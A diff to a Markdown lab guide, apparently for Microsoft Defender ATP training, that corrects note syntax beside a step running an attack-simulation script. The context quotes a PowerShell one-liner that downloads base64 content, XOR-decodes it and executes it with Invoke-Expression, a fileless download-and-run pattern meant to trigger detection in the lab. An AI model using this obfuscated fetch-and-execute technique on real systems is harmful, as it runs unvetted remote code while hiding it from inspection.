@@ -365,9 +365,9 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 4. [] Press **(Y)** to confirm onboarding.
 5. [] To run **Attack Simulation #1 "Automated investigation (fileless attack)"**, right-click **on AttackSimulation1.ps1** on the desktop, and click **Run with PowerShell**.
 
-	> ![NOTE] A notepad window will launch to show that the attack was successful. Leave the notepad window open and continue with the lab.
+	> [!NOTE] A notepad window will launch to show that the attack was successful. Leave the notepad window open and continue with the lab.
 	
-	> ![KNOWLEDGE] The powershell commands that are run are in the block below.
+	> [!KNOWLEDGE] The powershell commands that are run are in the block below.
 	> 
 	> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
 
